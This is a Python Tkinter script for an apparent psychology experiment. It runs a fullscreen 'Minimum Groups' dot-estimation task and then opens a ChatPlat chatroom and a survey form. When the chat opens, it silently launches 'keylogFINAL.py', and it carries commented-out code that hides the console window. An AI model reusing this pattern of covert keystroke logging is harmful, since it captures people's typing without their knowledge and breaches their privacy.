import self as self

try:
    import Tkinter as tkobj  # Python 2
except ImportError:
    import tkinter as tkobj  # Python 3
import time
import webbrowser
import keyboard
import os
import ctypes
import pynput
import tkinter as tk

# Input of Chatplat chatroom code, to be use for patch
chatPlatCode = input("Enter ChatPlat code: ")
#participantID = input ("Enter Participant ID: ")


# Hide shell after entering code, commented out for now, for troubleshooting
"""
kernel32 = ctypes.WinDLL('kernel32') #Hides terminal
user32 = ctypes.WinDLL('user32')
hWnd = kernel32.GetConsoleWindow()
if hWnd:
    user32.ShowWindow(hWnd, 0)
"""

# NOTE: Please feel free to copy and paste your newest code in, as I am still on the version from Tuesday.
# Please  just do not remove the procedure method and be sure to include it in updates, as it is now functioning. Thanks!

# Tkinter Object
window = tkobj.Tk()

# WINDOW PROPERTIES
window.title("Minimum Groups")
window.attributes("-fullscreen", True)
window['background'] = 'white'

pointList = []
count = 1
nextCount = 0
patch = 0
checkpoint = 0

procCount = 0
procArrayCount = 1
procList = []

outroCount = 0
# outroArrayCount = 1
# outroList = []
answer = []

# LABEL WIDGET
startImage = tkobj.PhotoImage(file=".\\sample_images\\proc\\proc.png")
enterImage = tkobj.PhotoImage(file=".\\sample_images\\enterImage.png")

# overEstimateStartImage = tkobj.PhotoImage(file=".\\sample_images\\overEstimator\\overEstimator.png")
# overEstimatePatchImage = tkobj.PhotoImage(file=".\\sample_images\\overEstimator\\overEstimatorPatch.png")
wait = tkobj.PhotoImage(file=".\\sample_images\\waitScreen.png")
overEstimateImage1 = tkobj.PhotoImage(file=".\\sample_images\\underEstimator\\underEstimator1.png")
overEstimateImage2 = tkobj.PhotoImage(file=".\\sample_images\\underEstimator\\underEstimator2.png")
overEstimateImage3 = tkobj.PhotoImage(file=".\\sample_images\\underEstimator\\underEstimator3.png")

rules1 = tkobj.PhotoImage(file=".\\sample_images\\rules1.png")
rules2 = tkobj.PhotoImage(file=".\\sample_images\\rules2.png")
rules3 = tkobj.PhotoImage(file=".\\sample_images\\rules3.png")
rules4 = tkobj.PhotoImage(file=".\\sample_images\\rules4.png")
rules5 = tkobj.PhotoImage(file=".\\sample_images\\rules5.png")

# PROCEDURE IMGS !!!
"""
proc1 = tkobj.PhotoImage(file=".\\sample_images\\proc1.png")
proc2 = tkobj.PhotoImage(file=".\\sample_images\\proc2.png")
"""

label = tkobj.Label(image=startImage)
label.pack(expand=1)

# Creates array of start images for introduction before procedure
while procArrayCount < 7:  # Amount of Images is n - 1 = 6
    procList.append(tkobj.PhotoImage(file=".\\sample_images\\proc\\proc" + str(procArrayCount) + ".png"))
    procArrayCount += 1
#####CHNG NMR
# Creates array of point images for procedure
while count < 41:  # Amount of Images is n - 1 = 40
    pointList.append(tkobj.PhotoImage(file=".\\sample_images\\points\\point (" + str(count) + ").png"))
    count += 1

# Creates array of 'outro' images following the procedure
# THIS INCLUDES PATCH IMAGES
# while outroArrayCount<4: #Amount of Images is n - 1 = 3
#	outroList.append(tkobj.PhotoImage(file=".\\sample_images\\overEstimator\\overEstimator" + str(outroArrayCount) + ".png"))
#	outroArrayCount += 1


# ENTRY WIDGET
fontType = ('Times New Roman', 30)
txt = tkobj.Entry(window, validate='key', font=fontType, width=5, justify="center")
txt.focus()
txt.pack(ipady=5, pady=100)

def disable(event):
    txt.get()
    return 'break'


def validate_input():
    global valid
    if txt.isdigit() and len(txt) > 0:
        valid = True
    else:
        valid = False


def pressed(press):
    if checkpoint == 0:
        procedure('<Return>')
    if checkpoint == 1:
        nextImg('<Return>')
    if checkpoint == 2:
        placement('<Return>')
    if checkpoint == 3:
        patch('<Return>')
        time.sleep(2)
        openChatplat(chatPlatCode)

def procedure(press):  # Checkpoint 0
    global checkpoint, procCount
    if procCount > 6:
        checkpoint = 1
    elif procCount == 6:  # Condiiton to force participant to press enter twice
        procCount += 1
    else:
        label.configure(image=procList[procCount])
        procCount += 1

def add():
    global nextCount
    nextCount+=1

def get_txt(entry):
    val = entry.get()
    return val


###CHNG DOT NUMBER
def nextImg(press):  # Checkpoint 1
    global nextCount, label, checkpoint, answer
    if nextCount == 40:
        checkpoint = 2
    else:
        txt.configure(state='disabled')
        label.configure(image=pointList[nextCount])
        #nextCount = nextCount + 1
        window.after(500, next, keyboard.is_pressed('enter'))
        #txt.delete(0, 'end')

def next(press):
    global answer,nextCount
    txt.pack(ipady=5, pady=100)
    txt.configure(state='normal')
    label.configure(image=enterImage)
    answer = str(get_txt(txt))
    if len(answer) > 0:
        #print(answer)
        add()
    txt.delete(0, 'end')




def loadScrn():
    global outroCount, checkpoint
    if outroCount == 1:
        label.configure(image=overEstimateImage1)
    elif outroCount == 2:
        label.configure(image=overEstimateImage2)
    elif outroCount == 3:
        label.configure(image=overEstimateImage3)
    else:
        checkpoint = 3


def placement(press):  # Checkpoint 2
    global checkpoint, outroCount, label
    if outroCount == 0:
        window.bind('<Return>', disable)
        label.configure(image= wait)
        window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 1:
        window.after(5000, loadScrn())
        window.bind('<Return>', pressed)
        outroCount += 1
    elif outroCount == 2:
        window.bind('<Return>', disable)
        label.configure(image=overEstimateImage2)
        window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 3:
        window.bind('<Return>', pressed)
        window.after(5000, loadScrn())
        outroCount += 1
    elif outroCount == 4:
        #window.bind('<Return>', disable)
        label.configure(image=rules1)
        # window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 5:
        label.configure(image=rules2)
        # window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 6:
        txt.configure(state='disabled')
        label.configure(image=rules3)
        # window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 7:
        label.configure(image=rules4)
        # window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    elif outroCount == 8:
        label.configure(image=rules5)
        # window.after(5000, placement, keyboard.is_pressed('enter'))
        outroCount += 1
    else:
        checkpoint = 3


def patch(press):  # Checkpoint 3
    global checkpoint, label
    # checkpoint = -1  # this functions as disabling the Return key
    # window.after(2000, openChatplat, chatPlatCode)
    window.destroy()


def openChatplat(code):
    webbrowser.open('chatplat.com/#/Chat/' + code, autoraise=True)
    os.system('keylogFINAL.py')
    webbrowser.open(
        'https://docs.google.com/forms/d/e/1FAIpQLSfBuWUMCn411FhA3koRp3lw_HZF_3-peIFH-CWsfdTWGX5RFQ/viewform?usp=sf_link')


def keylogger():
    os.system('keylogFINAL.py')


window.bind('<Return>', pressed)

window.mainloop()